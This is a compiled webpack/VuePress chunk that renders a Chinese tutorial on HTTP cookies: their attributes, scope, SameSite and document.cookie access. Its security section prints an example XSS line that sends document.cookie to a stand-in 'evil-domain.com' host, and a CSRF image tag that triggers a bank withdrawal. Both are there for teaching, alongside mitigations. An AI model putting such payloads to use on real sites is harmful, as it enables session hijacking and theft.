(window.webpackJsonp=window.webpackJsonp||[]).push([[106],{461:function(o,e,t){"use strict";t.r(e);var a=t(42),s=Object(a.a)({},(function(){var o=this,e=o.$createElement,t=o._self._c||e;return t("ContentSlotsDistributor",{attrs:{"slot-key":o.$parent.slotKey}},[t("h1",{attrs:{id:"http-cookie"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#http-cookie"}},[o._v("#")]),o._v(" ⭐️HTTP Cookie")]),o._v(" "),t("p"),t("div",{staticClass:"table-of-contents"},[t("ul",[t("li",[t("a",{attrs:{href:"#创建cookie"}},[o._v("创建Cookie")]),t("ul",[t("li",[t("a",{attrs:{href:"#set-cookie响应头部和cookie请求头部"}},[o._v("Set-Cookie响应头部和Cookie请求头部")])]),t("li",[t("a",{attrs:{href:"#会话期cookie"}},[o._v("会话期Cookie")])]),t("li",[t("a",{attrs:{href:"#持久性cookie"}},[o._v("持久性Cookie")])]),t("li",[t("a",{attrs:{href:"#cookie的-secure-和-httponly-标记"}},[o._v("Cookie的Secure和HttpOnly标记")])]),t("li",[t("a",{attrs:{href:"#cookie的作用域"}},[o._v("Cookie的作用域")])]),t("li",[t("a",{attrs:{href:"#samesite-cookies"}},[o._v("SameSite Cookies")])]),t("li",[t("a",{attrs:{href:"#javascript通过-document-cookies-访问cookie"}},[o._v("JavaScript通过Document.cookies访问Cookie")])])])]),t("li",[t("a",{attrs:{href:"#安全"}},[o._v("安全")]),t("ul",[t("li",[t("a",{attrs:{href:"#会话劫持和xss"}},[o._v("会话劫持和XSS")])]),t("li",[t("a",{attrs:{href:"#跨站请求伪造-csrf"}},[o._v("跨站请求伪造（CSRF）")])])])]),t("li",[t("a",{attrs:{href:"#总结"}},[o._v("\b总结")])])])]),o._v("\nHTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。"),t("p"),o._v(" "),t("p",[o._v("Cookie主要用于以下三个方面：")]),o._v(" "),t("ul",[t("li",[o._v("会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）")]),o._v(" "),t("li",[o._v("个性化设置（如用户自定义设置、主题等）")]),o._v(" "),t("li",[o._v("浏览器行为跟踪（如跟踪分析用户行为等")])]),o._v(" "),t("p",[o._v("Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie渐渐被淘汰。由于服务器指定Cookie后，浏览器的每次请求都会携带Cookie数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）或IndexedDB。")]),o._v(" "),t("h2",{attrs:{id:"创建cookie"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#创建cookie"}},[o._v("#")]),o._v(" 创建Cookie")]),o._v(" "),t("p",[o._v("当服务器收到HTTP请求时，服务器可以在响应头里面添加一个"),t("code",[o._v("Set-Cookie")]),o._v("选项。浏览器收到响应后通常会保存下Cookie，之后对该服务器每一次请求中都通过"),t("code",[o._v("Cookie")]),o._v("请求头部将Cookie信息发送给服务器。另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。")]),o._v(" "),t("h3",{attrs:{id:"set-cookie响应头部和cookie请求头部"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#set-cookie响应头部和cookie请求头部"}},[o._v("#")]),o._v(" Set-Cookie响应头部和Cookie请求头部")]),o._v(" "),t("p",[o._v("服务器使用"),t("code",[o._v("Set-Cookie")]),o._v("响应头部向用户代理（一般是浏览器）发送Cookie信息。一个简单的Cookie可能像这样：")]),o._v(" "),t("div",{staticClass:"language- extra-class"},[t("pre",{pre:!0,attrs:{class:"language-text"}},[t("code",[o._v("Set-Cookie: <cookie名>=<cookie值>\n")])])]),t("p",[o._v("服务器通过该头部告知客户端保存Cookie信息。"),t("br"),o._v("\n现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的Cookie信息通过Cookie请求头部再发送给服务器。")]),o._v(" "),t("h3",{attrs:{id:"会话期cookie"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#会话期cookie"}},[o._v("#")]),o._v(" 会话期Cookie")]),o._v(" "),t("p",[o._v("会话期Cookie是最简单的Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（Expires）或者有效期（Max-Age）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie也会被保留下来，就好像浏览器从来没有关闭一样。")]),o._v(" "),t("h3",{attrs:{id:"持久性cookie"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#持久性cookie"}},[o._v("#")]),o._v(" 持久性Cookie")]),o._v(" "),t("p",[o._v("和关闭浏览器便失效的会话期Cookie不同，持久性Cookie可以指定一个特定的过期时间（"),t("code",[o._v("Expires")]),o._v("）或有效期（"),t("code",[o._v("Max-Age")]),o._v("）。")]),o._v(" "),t("h3",{attrs:{id:"cookie的secure和httponly标记"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#cookie的secure和httponly标记"}},[o._v("#")]),o._v(" Cookie的"),t("code",[o._v("Secure")]),o._v("和"),t("code",[o._v("HttpOnly")]),o._v("标记")]),o._v(" "),t("p",[o._v("标记为"),t("code",[o._v("Secure")]),o._v("的"),t("code",[o._v("Cookie")]),o._v("只应通过被HTTPS协议加密过的请求发送给服务端。但即便设置了"),t("code",[o._v("Secure")]),o._v("标记，敏感信息也不应该通过Cookie传输，因为Cookie有其固有的不安全性，"),t("code",[o._v("Secure")]),o._v("标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）无法使用Cookie的 Secure 标记。")]),o._v(" "),t("p",[o._v("为避免跨域脚本 (XSS) 攻击，通过JavaScript的 "),t("code",[o._v("Document.cookie")]),o._v(" API无法访问带有"),t("code",[o._v("HttpOnly")]),o._v("标记的Cookie，它们只应该发送给服务端。如果包含服务端Session信息的 Cookie不想被客户端JavaScript脚本调用，那么就应该为其设置HttpOnly标记。")]),o._v(" "),t("h3",{attrs:{id:"cookie的作用域"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#cookie的作用域"}},[o._v("#")]),o._v(" Cookie的作用域")]),o._v(" "),t("p",[t("code",[o._v("Domain")]),o._v("和"),t("code",[o._v("Path")]),o._v("标识定义了Cookie的作用域：即Cookie应该发送给哪些URL。")]),o._v(" "),t("p",[t("code",[o._v("Domain")]),o._v("标识指定了哪些主机可以接受Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了"),t("code",[o._v("Domain")]),o._v("，则一般包含子域名。")]),o._v(" "),t("p",[o._v("例如，如果设置"),t("code",[o._v("Domain=mozilla.org")]),o._v("，则Cookie也包含在子域名中（如"),t("code",[o._v("developer.mozilla.org")]),o._v("）。")]),o._v(" "),t("p",[t("code",[o._v("Path")]),o._v("标识指定了主机下的哪些路径可以接受Cookie（"),t("strong",[o._v("该URL路径必须存在于请求URL中")]),o._v("）。以字符 "),t("code",[o._v("%x2F")]),o._v(' ("/") 作为路径分隔符，子路径也会被匹配。')]),o._v(" "),t("p",[o._v("例如，设置"),t("code",[o._v("Path=/docs")]),o._v("，则以下地址都会匹配：")]),o._v(" "),t("ul",[t("li",[t("code",[o._v("/docs")])]),o._v(" "),t("li",[t("code",[o._v("/docs/Web/")])]),o._v(" "),t("li",[t("code",[o._v("/docs/Web/HTTP")])])]),o._v(" "),t("h3",{attrs:{id:"samesite-cookies"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#samesite-cookies"}},[o._v("#")]),o._v(" "),t("code",[o._v("SameSite")]),o._v(" Cookies")]),o._v(" "),t("p",[t("code",[o._v("SameSite")]),o._v("Cookie允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。但目前"),t("code",[o._v("SameSite")]),o._v("Cookie还处于实验阶段，并不是所有浏览器都支持。")]),o._v(" "),t("h3",{attrs:{id:"javascript通过document-cookies访问cookie"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#javascript通过document-cookies访问cookie"}},[o._v("#")]),o._v(" JavaScript通过"),t("code",[o._v("Document.cookies")]),o._v("访问Cookie")]),o._v(" "),t("p",[o._v("通过"),t("code",[o._v("Document.cookie")]),o._v("属性可创建新的Cookie，也可通过该属性访问非HttpOnly标记的Cookie。")]),o._v(" "),t("p",[o._v("请留意在安全节提到的安全隐患问题，JavaScript可以通过跨站脚本攻击（XSS）的方式来窃取Cookie。")]),o._v(" "),t("h2",{attrs:{id:"安全"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#安全"}},[o._v("#")]),o._v(" 安全")]),o._v(" "),t("h3",{attrs:{id:"会话劫持和xss"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#会话劫持和xss"}},[o._v("#")]),o._v(" 会话劫持和XSS")]),o._v(" "),t("p",[o._v("在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。")]),o._v(" "),t("div",{staticClass:"language-javascript extra-class"},[t("pre",{pre:!0,attrs:{class:"language-javascript"}},[t("code",[t("span",{pre:!0,attrs:{class:"token punctuation"}},[o._v("(")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[o._v("new")]),o._v(" "),t("span",{pre:!0,attrs:{class:"token class-name"}},[o._v("Image")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[o._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[o._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[o._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[o._v(".")]),o._v("src "),t("span",{pre:!0,attrs:{class:"token operator"}},[o._v("=")]),o._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[o._v('"http://www.evil-domain.com/steal-cookie.php?cookie="')]),o._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[o._v("+")]),o._v(" document"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[o._v(".")]),o._v("cookie"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[o._v(";")]),o._v("\n")])])]),t("p",[o._v("HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。")]),o._v(" "),t("h3",{attrs:{id:"跨站请求伪造-csrf"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#跨站请求伪造-csrf"}},[o._v("#")]),o._v(" 跨站请求伪造（CSRF）")]),o._v(" "),t("p",[o._v("维基百科已经给了一个比较好的CSRF例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：")]),o._v(" "),t("div",{staticClass:"language-javascript extra-class"},[t("pre",{pre:!0,attrs:{class:"language-javascript"}},[t("code",[t("span",{pre:!0,attrs:{class:"token operator"}},[o._v("<")]),o._v("img src"),t("span",{pre:!0,attrs:{class:"token operator"}},[o._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[o._v('"http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory"')]),t("span",{pre:!0,attrs:{class:"token operator"}},[o._v(">")]),o._v("\n")])])]),t("p",[o._v("当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：")]),o._v(" "),t("p",[o._v("对用户输入进行过滤来阻止XSS；\n任何敏感操作都需要确认；\n用于敏感信息的Cookie只能拥有较短的生命周期；\n更多方法可以查看OWASP CSRF prevention cheat sheet。")]),o._v(" "),t("h2",{attrs:{id:"总结"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#总结"}},[o._v("#")]),o._v(" \b总结")]),o._v(" "),t("p",[o._v("目前下列字段可以被\b设置在\b服务端Set-cookie时设置：")]),o._v(" "),t("ol",[t("li",[o._v("Expires：过期时间")]),o._v(" "),t("li",[o._v("Max-Age：有效期时长")]),o._v(" "),t("li",[o._v("Secure：cookie只应通过被HTTPS协议加密过的请求发送给服务端")]),o._v(" "),t("li",[o._v("HttpOnly：Document.cookie API无法访问带有 HttpOnly 标记的Cookie")]),o._v(" "),t("li",[o._v("Domain：标识指定了哪些主机可以接受Cookie")]),o._v(" "),t("li",[o._v("Path：标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中）")]),o._v(" "),t("li",[o._v("SameSite：Cookie允许服务器要求某个cookie在跨站请求时不会被发送")])]),o._v(" "),t("p",[o._v("参考资料："),t("br"),o._v(" "),t("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies",target:"_blank",rel:"noopener noreferrer"}},[o._v("https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies"),t("OutboundLink")],1)])])}),[],!1,null,null,null);e.default=s.exports}}]);